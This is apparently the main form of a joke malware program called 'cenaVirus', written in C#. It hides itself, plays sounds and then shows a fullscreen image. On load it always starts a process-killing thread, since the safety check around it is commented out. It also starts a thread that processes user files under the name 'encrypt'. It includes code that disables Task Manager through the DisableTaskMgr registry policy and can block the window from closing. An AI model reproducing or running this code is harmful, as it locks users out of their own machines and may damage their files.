using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.IO;
using System.Security.AccessControl;
using System.Media;

namespace cenaVirus
{

    public partial class Form1 : Form
    {


        //Safety switch. If you set this to false you WILL FUCK UP your computer!!!!!!
        //DO NOT SET TO FALSE
        //NEVER SET TO FALSE
        //THIS WILL FUCK YOU UP. 
        //DON'T DO IT!!!!!!!
        static Boolean safetySwitch = true;
        //True is safe
        // <summary>
        // ABSOLUTELY NOT DONT DO IT YOU IDIOT!!!!
        // </summary>


        SoundPlayer playerSouls;
        SoundPlayer cena;

        public Form1()
        {
            this.Visible = false;
            playerSouls = new SoundPlayer();
            playerSouls.SoundLocation = AppDomain.CurrentDomain.BaseDirectory + "\\souls.wav";
            playerSouls.Play();

            cena = new SoundPlayer();
            cena.SoundLocation = AppDomain.CurrentDomain.BaseDirectory + "\\cena.wav";


            InitializeComponent();
            greenCena.Visible = false;
        }


        private void Form1_Load(object sender, EventArgs e)
        {
            this.Visible = false;

            taskProcKill killTask = new taskProcKill();
            encrypt userFiles = new encrypt(safetySwitch);

            Thread taskKiller = new Thread(new ThreadStart(killTask.procKiller));
            Thread encryptDocs = new Thread(new ThreadStart(userFiles.processUser));

            //If safe dont kill taskmanager
            //if (!safetySwitch)
                taskKiller.Start();

            encryptDocs.Start();

            cenaTimer.Enabled = true;
            cenaTimer.Stop();
            formTimer.Enabled = true;
            formTimer.Start();

            //KillCtrlAltDelete();

        }


        /***********************************************
            ****************************************

                    Neat STUFF not being used

            ****************************************
        ************************************************/


        //Disable taskmanager:
        public void KillCtrlAltDelete()
        {
            RegistryKey regkey;
            string keyValueInt = "1";
            string subKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";

            try
            {
                regkey = Registry.CurrentUser.CreateSubKey(subKey);
                regkey.SetValue("DisableTaskMgr", keyValueInt);
                regkey.Close();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            greenCena.Visible = true;
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            greenCena.Size = new System.Drawing.Size(this.Width, this.Height);
            greenCena.SizeMode = PictureBoxSizeMode.StretchImage;
            greenCena.Dock = DockStyle.Fill;
        }

        private void formTimer_Tick(object sender, EventArgs e)
        {
            this.Visible = true;
            cenaTimer.Start();
            formTimer.Stop();

        }

        private void cenaTimer_Tick(object sender, EventArgs e)
        {
            playerSouls.Stop();
            cena.PlayLooping();
            pbDante.Visible = false;
            pbFeature.Visible = false;
            pbFontendo.Visible = false;
            pbRedDude.Visible = false;
            pbVirus.Visible = false;
            greenCena.Visible = true;
            cenaTimer.Stop();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if(safetySwitch==false)
             e.Cancel = true;
        }
    }
}
